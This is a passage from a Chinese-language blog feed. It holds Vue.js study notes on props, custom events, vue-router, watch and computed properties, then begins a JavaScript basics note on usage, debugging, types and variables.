<h2 id="动态-Prop"><a href="#动态-Prop" class="headerlink" title="动态 Prop"></a>动态 Prop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div&gt;</span><br><span class="line">	  &lt;input v-model=&quot;parentMsg&quot;&gt;</span><br><span class="line">	  &lt;br&gt;</span><br><span class="line">	  &lt;child v-bind:message=&quot;parentMsg&quot;&gt;&lt;/child&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 注册</span><br><span class="line">Vue.component(&apos;child&apos;, &#123;</span><br><span class="line">  // 声明 props</span><br><span class="line">  props: [&apos;message&apos;],</span><br><span class="line">  // 同样也可以在 vm 实例中像 “this.message” 这样使用</span><br><span class="line">  template: &apos;&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&apos;</span><br><span class="line">&#125;)</span><br><span class="line">// 创建根实例</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">	parentMsg: &apos;父组件内容&apos;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Prop-实例"><a href="#Prop-实例" class="headerlink" title="Prop 实例"></a>Prop 实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;ol&gt;</span><br><span class="line">    &lt;todo-item v-for=&quot;item in sites&quot; v-bind:todo=&quot;item&quot;&gt;&lt;/todo-item&gt;</span><br><span class="line">  	&lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">Vue.component(&apos;todo-item&apos;, &#123;</span><br><span class="line">  props: [&apos;todo&apos;],</span><br><span class="line">  template: &apos;&lt;li&gt;&#123;&#123; todo.text &#125;&#125;&lt;/li&gt;&apos;</span><br><span class="line">&#125;)</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#app&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    sites: [</span><br><span class="line">      &#123; text: &apos;Runoob&apos; &#125;,</span><br><span class="line">      &#123; text: &apos;Google&apos; &#125;,</span><br><span class="line">      &#123; text: &apos;Taobao&apos; &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="data与props区别"><a href="#data与props区别" class="headerlink" title="data与props区别"></a>data与props区别</h2><p>data中的数据可读可写</p>
<p>props中的数据只可读</p>
<h2 id="自定义事件"><a href="#自定义事件" class="headerlink" title="自定义事件"></a>自定义事件</h2><p><code>父组件是使用 props 传递数据给子组件，但如果子组件要把数据传递回去，就需要使用自定义事件！</code></p>
<p>我们可以使用 v-on 绑定自定义事件, 每个 Vue 实例都实现了事件接口(Events interface)，即：</p>
<ul>
<li>使用 <code>$on(eventName)</code> 监听事件</li>
<li>使用 <code>$emit(eventName)</code> 触发事件</li>
</ul>
<p>不传参实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;counter-event-example&quot;&gt;</span><br><span class="line">	  &lt;p&gt;&#123;&#123; total &#125;&#125;&lt;/p&gt;</span><br><span class="line">	  &lt;button-counter v-on:increment=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt;</span><br><span class="line">	  &lt;button-counter v-on:increment=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">Vue.component(&apos;button-counter&apos;, &#123;</span><br><span class="line">  template: &apos;&lt;button v-on:click=&quot;incrementHandler&quot;&gt;&#123;&#123; counter &#125;&#125;&lt;/button&gt;&apos;,</span><br><span class="line">  data: function () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      counter: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    incrementHandler: function () &#123;</span><br><span class="line">      this.counter += 1</span><br><span class="line">      this.$emit(&apos;increment&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#counter-event-example&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    total: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    incrementTotal: function () &#123;</span><br><span class="line">      this.total += 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>传参实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">	&lt;div id=&quot;counter-event-example&quot;&gt;</span><br><span class="line">		&lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;/h1&gt;</span><br><span class="line">	  &lt;p&gt;&#123;&#123; total &#125;&#125;&lt;/p&gt;</span><br><span class="line">	  &lt;button-counter v-on:increment=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt;</span><br><span class="line">	  &lt;button-counter v-on:increment=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">Vue.component(&apos;button-counter&apos;, &#123;</span><br><span class="line">  template: &apos;&lt;button v-on:click=&quot;incrementHandler&quot;&gt;&#123;&#123; counter &#125;&#125;&lt;/button&gt;&apos;,</span><br><span class="line">  data: function () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      counter: 0,</span><br><span class="line">	  msg : `msg`</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    incrementHandler: function () &#123;</span><br><span class="line">      this.counter += 1</span><br><span class="line">      this.$emit(&apos;increment&apos;,this.msg)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  el: &apos;#counter-event-example&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">    total: 0,</span><br><span class="line">	msg:`1`</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    incrementTotal: function (msg) &#123;</span><br><span class="line">      this.total += 1,</span><br><span class="line">	  this.msg = msg</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p><strong>后端路由：</strong>对于普通的网站，所有的超链接都是URL地址，所有的URL地址都对应服务器上对应的资源；</p>
<p><strong>前端路由：</strong>对于单页面应用程序来说，主要通过URL中的hash(#号)来实现不同页面之间的切换，同时，hash有一个特点：HTTP请求中不会包含hash相关的内容；所以，单页面程序中的页面跳转主要用hash实现；</p>
<p>在单页面应用程序中，这种通过hash改变来切换页面的方式，称作前端路由（区别于后端路由)</p>
<h2 id="路由安装"><a href="#路由安装" class="headerlink" title="路由安装"></a>路由安装</h2><p>淘宝镜像：</p>
<p><code>cnpm install vue-router</code></p>
<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://cdn.staticfile.org/vue/2.4.2/vue.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.staticfile.org/vue-router/2.7.0/vue-router.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;h1&gt;Hello App!&lt;/h1&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;!-- 使用 router-link 组件来导航. --&gt;</span><br><span class="line">    &lt;!-- 通过传入 `to` 属性指定链接. --&gt;</span><br><span class="line">    &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt;</span><br><span class="line">    &lt;router-link to=&quot;/foo&quot;&gt;Go to Foo&lt;/router-link&gt;</span><br><span class="line">    &lt;router-link to=&quot;/bar&quot;&gt;Go to Bar&lt;/router-link&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;!-- 路由出口 --&gt;</span><br><span class="line">  &lt;!-- 路由匹配到的组件将渲染在这里 --&gt;</span><br><span class="line">  &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">// 0. 如果使用模块化机制编程，導入Vue和VueRouter，要调用 Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line">// 1. 定义（路由）组件。</span><br><span class="line">// 可以从其他文件 import 进来</span><br><span class="line">const Foo = &#123; template: &apos;&lt;div&gt;foo&lt;/div&gt;&apos; &#125;</span><br><span class="line">const Bar = &#123; template: &apos;&lt;div&gt;bar&lt;/div&gt;&apos; &#125;</span><br><span class="line"></span><br><span class="line">// 2. 定义路由</span><br><span class="line">// 每个路由应该映射一个组件。 其中&quot;component&quot; 可以是</span><br><span class="line">// 通过 Vue.extend() 创建的组件构造器，</span><br><span class="line">// 或者，只是一个组件配置对象。</span><br><span class="line">// 我们晚点再讨论嵌套路由。</span><br><span class="line">const routes = [</span><br><span class="line">  &#123; path: &apos;/foo&apos;, component: Foo &#125;,</span><br><span class="line">  &#123; path: &apos;/bar&apos;, component: Bar &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 3. 创建 router 实例，然后传 `routes` 配置</span><br><span class="line">// 你还可以传别的配置参数, 不过先这么简单着吧。</span><br><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes // （缩写）相当于 routes: routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 4. 创建和挂载根实例。</span><br><span class="line">// 记得要通过 router 配置参数注入路由，</span><br><span class="line">// 从而让整个应用都有路由功能</span><br><span class="line">const app = new Vue(&#123;</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(&apos;#app&apos;)</span><br><span class="line"></span><br><span class="line">// 现在，应用已经启动了！</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="相关属性"><a href="#相关属性" class="headerlink" title=" 相关属性"></a><router-link> 相关属性</router-link></h2><p><router-link>是一个组件，该组件用于设置一个导航链接，切换不同 HTML 内容。 <strong>to</strong> 属性为目标地址。</router-link></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 字符串 --&gt;</span><br><span class="line">&lt;router-link to=&quot;home&quot;&gt;Home&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 渲染结果 --&gt;</span><br><span class="line">&lt;a href=&quot;home&quot;&gt;Home&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>replace</li>
</ul>
<p><code>设置 replace 属性的话，当点击时，会调用 router.replace() 而不是 router.push()，导航后不会留下 history 记录。</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; path: &apos;/abc&apos;&#125;&quot; replace&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>append</li>
</ul>
<p><code>设置 append 属性后，则在当前 (相对) 路径前添加基路径。例如，我们从 /a 导航到一个相对路径 b，如果没有配置 append，则路径为 /b，如果配了，则为 /a/b</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to=&quot;&#123; path: &apos;relative/path&apos;&#125;&quot; append&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>tag</li>
</ul>
<p><code>&lt;router-link&gt;` 渲染成某种标签，例如 `&lt;li&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/foo&quot; tag=&quot;li&quot;&gt;foo&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 渲染结果 --&gt;</span><br><span class="line">&lt;li&gt;foo&lt;/li&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>active-class</p>
<p><code>链接激活时使用的 CSS 类名</code></p>
<p><code>active_class=&quot;_active&#39;&#39;</code></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">   ._active&#123;</span><br><span class="line">      background-color : red;</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">   &lt;router-link v-bind:to = &quot;&#123; path: &apos;/route1&apos;&#125;&quot; active-class = &quot;_active&quot;&gt;Router Link 1&lt;/router-link&gt;</span><br><span class="line">   &lt;router-link v-bind:to = &quot;&#123; path: &apos;/route2&apos;&#125;&quot; tag = &quot;span&quot;&gt;Router Link 2&lt;/router-link&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h1 id="路由传参"><a href="#路由传参" class="headerlink" title="路由传参"></a>路由传参</h1><h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/GoodsInfo?a=1&quot;&gt;&lt;/router-link&gt;</span><br><span class="line">&lt;srcipt&gt;</span><br><span class="line">    </span><br><span class="line">routes: [</span><br><span class="line">    &#123; path: &apos;/login&apos;, component: login &#125;</span><br><span class="line">  ]</span><br><span class="line">    </span><br><span class="line">&#125;)&lt;/srcipt&gt;</span><br></pre></td></tr></table></figure>

<p><code>在相应组件里接收 :this.$route.query.a</code></p>
<h2 id="params"><a href="#params" class="headerlink" title="params"></a>params</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/GoodsInfo/12&quot;&gt;&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;srcipt&gt;</span><br><span class="line">    </span><br><span class="line">routes: [</span><br><span class="line">    &#123; path: &apos;/login/:id&apos;, component: login &#125;</span><br><span class="line">  ]</span><br><span class="line">    </span><br><span class="line">&#125;)&lt;/srcipt&gt;</span><br></pre></td></tr></table></figure>

<p><code>在相应组件里接收 :$route.params.id</code></p>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123; path: &apos;/a&apos;, redirect: &apos;/b&apos; &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="嵌套命名"><a href="#嵌套命名" class="headerlink" title="嵌套命名"></a>嵌套命名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  path: &apos;/settings&apos;,</span><br><span class="line">  // 你也可以在顶级路由就配置命名视图</span><br><span class="line">  component: UserSettings,</span><br><span class="line">  children: [&#123;</span><br><span class="line">    path: &apos;emails&apos;,</span><br><span class="line">    component: UserEmailsSubscriptions</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="命名视图"><a href="#命名视图" class="headerlink" title="命名视图"></a>命名视图</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-view class=&quot;view one&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;router-view class=&quot;view two&quot; name=&quot;a&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;router-view class=&quot;view three&quot; name=&quot;b&quot;&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const router = new VueRouter(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/&apos;,</span><br><span class="line">      components: &#123;</span><br><span class="line">        default: Foo,</span><br><span class="line">        a: Bar,</span><br><span class="line">        b: Baz</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="监听属性-watch"><a href="#监听属性-watch" class="headerlink" title="监听属性(watch)"></a>监听属性(watch)</h1><p>实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;firstname&quot;&gt;+</span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;lastname&quot;&gt;=                                      </span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;fullname&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var vm = new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            firstname:&apos;&apos;,</span><br><span class="line">            lastname:&apos;&apos;,</span><br><span class="line">            fullname:&apos;&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        watch:&#123;</span><br><span class="line">            &apos;firstname&apos;:function(newVal,oldVal)&#123;</span><br><span class="line">                this.fullname = newVal + this.lastname</span><br><span class="line">            &#125;,</span><br><span class="line">            &apos;lastname&apos;:function(newVal)&#123;</span><br><span class="line">                this.fullname = this.firstname + newVal</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="计算属性-computed"><a href="#计算属性-computed" class="headerlink" title="计算属性(computed)"></a>计算属性(computed)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;firstname&quot;&gt;+</span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;lastname&quot;&gt;=                                      </span><br><span class="line">    &lt;input type=&apos;test&apos; v-model=&quot;fullname&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var vm = new Vue(&#123;</span><br><span class="line">        el:&apos;#app&apos;,</span><br><span class="line">        data:&#123;</span><br><span class="line">            firstname:&apos;&apos;,</span><br><span class="line">            lastname:&apos;&apos;,</span><br><span class="line">        &#125;,</span><br><span class="line">        computed:&#123;</span><br><span class="line">            fullname:function()&#123;</span><br><span class="line">                return this.firstname + this.lastname</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> 前端 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> VUE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javascript基础]]></title>
      <url>/2020/03/26/javascript%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<h1 id="JavaScript笔记"><a href="#JavaScript笔记" class="headerlink" title="JavaScript笔记"></a>JavaScript笔记</h1><h1 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h1><p><code>JavaScript 是互联网上最流行的脚本语言，这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。</code></p>
<p>JavaScript 是一种轻量级的编程语言。</p>
<p>JavaScript 是可插入 HTML 页面的编程代码。</p>
<p>JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行。</p>
<p>JavaScript 很容易学习。</p>
<ul>
<li><strong>HTML</strong>定义了网页的内容</li>
<li><strong>CSS</strong> 描述了网页的布局</li>
<li><strong>JavaScript</strong> 网页的行为</li>
</ul>
<h1 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h1><ul>
<li>html标签内</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"按钮"</span> <span class="attr">onclick</span>=<span class="string">"alert(123)"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>script标签内</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert("123");</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>外部的 JavaScript</li>
</ul>
<p><code>外部脚本不能包含 &lt;script&gt; 标签。</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"1.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="JavaScript学习参考地址"><a href="#JavaScript学习参考地址" class="headerlink" title="JavaScript学习参考地址"></a>JavaScript学习参考地址</h1><p>菜鸟教程：<a href="https://www.runoob.com/js/js-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/js/js-tutorial.html</a></p>
<p>阿里云大学：<a href="https://edu.aliyun.com/course/473" target="_blank" rel="noopener">https://edu.aliyun.com/course/473</a></p>
<h1 id="JavaScript调试"><a href="#JavaScript调试" class="headerlink" title="JavaScript调试"></a>JavaScript调试</h1><ul>
<li>console.log()</li>
</ul>
<p>使用 <strong>console.log()</strong> 方法在浏览器中显示 JavaScript 值浏览器中使用 F12 来启用调试模式， 在调试窗口中点击 “Console” 菜单。</p>
<h1 id="JavaScript类型"><a href="#JavaScript类型" class="headerlink" title="JavaScript类型"></a>JavaScript类型</h1><ul>
<li>数字（Number）：3.14、1、1024</li>
<li>字符串（String）：“msg”、’msg’</li>
<li>数组（Array）：[40, 100, 1, 5, 25, 10]</li>
<li>对象（Object）：{firstName:”John”, lastName:”Doe”, age:50, eyeColor:”blue”}</li>
<li>函数（Function）function myFunction(a, b) { return a * b;}</li>
</ul>
<h1 id="JavaScript-变量"><a href="#JavaScript-变量" class="headerlink" title="JavaScript 变量"></a>JavaScript 变量</h1><p>JavaScript 使用关键字 <strong>var</strong> 来定义变量， 使用等号来为变量赋值</p>
<p>var a= 1</p>
<p>var s = ‘msg’</p>
